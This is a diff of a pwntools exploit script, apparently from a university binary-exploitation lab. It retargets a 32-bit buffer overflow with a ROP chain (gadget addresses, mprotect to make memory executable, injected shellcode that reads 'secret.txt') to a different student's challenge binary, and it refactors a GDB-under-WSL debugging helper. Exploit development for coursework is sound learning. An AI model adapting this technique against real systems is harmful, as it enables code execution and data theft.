@@ -4,46 +4,32 @@ from pwn import *
 IP = "0.0.0.0"
 PORT = 0
 
-file_secret = "secret.txt"
-# file_binary = "10101_YAKOBCHUK_Dmytro_32"
-# file_binary = "10126_ZELENIN_Vladyslav_32"
-file_binary = "10122_STOKOP_Sofia_32"
 file_breakpoints = "breaks32.gdb"
+file_secret = "secret.txt"
+file_binary = "10101_YAKOBCHUK_Dmytro_32"
+context.binary = ELF(f"./{file_binary}")
 
 # GADGETS
-pop_eax = p32(0x80b0fca)  # pop eax; ret
-pop_ebx = p32(0x8065bbb)  # pop ebx; ret
-mov_ecx_eax___mov_eax_ecx = p32(0x8094018)  # mov ecx, eax; mov eax, ecx; ret
-pop_edx___pop_ebx = p32(0x8058739)  # pop edx; pop ebx; ret
-syscall = p32(0x8071a90)  # int 0x80; ret
-ret = p32(0x8071a92)  # ret
+pop_eax = p32(0x80b0cda)  # pop eax; ret
+pop_ebx = p32(0x804e4be)  # pop ebx; ret
+mov_ecx_eax___mov_eax_ecx = p32(0x8093df8)  # mov ecx, eax; mov eax, ecx; ret
+pop_edx___pop_ebx = p32(0x8058959)  # pop edx; pop ebx; ret
+syscall = p32(0x8071c50)  # int 0x80; ret
+ret = p32(0x8049d20)  # ret
 
 
-def run_local(debug = True, wsl2 = True):
-    binary = ELF(f"./{file_binary}")
-    context.arch = "i386"
-    context.aslr = False  # True for cyclic(), False for clean run
-
-    p = process([f"./{file_binary}"], env = {})
+def run_locally(payload = False, debug = True):
+    context.aslr = not payload  # True for cyclic(), False for clean run
+    p = process([context.binary.path], env = {})
     pid = util.proc.pidof(p)[0]
-    if debug == False:
-        return p
-
-    if wsl2 == False:  # Debug in Linux
-        log.info(f"Waiting for GDB...\n"
-                 f"$ gdb -q -p {pid}")
-        pause()
-        return p
-
-    # Debug in WSL2
-    gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
-    log.debug(f"Gdb uses breakpoints from {file_breakpoints}")
-
-    new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
-    wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
-    cmd = f"cmd.exe /c start {new_tab} {wsl}"
-    os.system(cmd)
-    util.proc.wait_for_debugger(pid)
+    if debug == True:
+        gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
+        log.debug(f"Gdb uses breakpoints from {file_breakpoints}")
+        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
+        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
+        cmd = f"cmd.exe /c start {new_tab} {wsl}"
+        os.system(cmd)
+        util.proc.wait_for_debugger(pid)
     return p
 
 
@@ -124,9 +110,9 @@ def main():
     sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))
 
     # Buffer overflow (with ret chain)
-    buf = b"A" * 973  # eax before "cmp eax, 0x539"
+    buf = b"A" * 898  # eax before "cmp eax, 0x539"
     buf += p32(1337)
-    buf += ret * 200
+    buf += ret * 200  # Ret chain
 
     # mprotect(): make RWX buffer for shellcode
     rwx_addr = 0x8048000
@@ -139,14 +125,14 @@ def main():
     buf += sys_read(stdin_fd, rwx_addr, len(sc))
 
     buf += p32(rwx_addr)  # Jump to shellcode
-    buf = buf.ljust(4873, b"B")  # ecx after "pop ecx"
-    buf += p32(0xffffd000)
+    buf = buf.ljust(4498, b"B")  # ecx after "pop ecx"
+    buf += p32(0xffffd000)  # Address of the ret chain in the stack
     # buf += p32(0xdddddddd)
     find_bad_bytes(buf)
 
     # RUN PROCESS
     buf = cyclic(5000)
-    p = run_local(debug = True, wsl2 = True)
+    p = run_locally(payload = True, debug = True)
     # p = remote(IP, PORT)
 
     log.info("=== buffer")
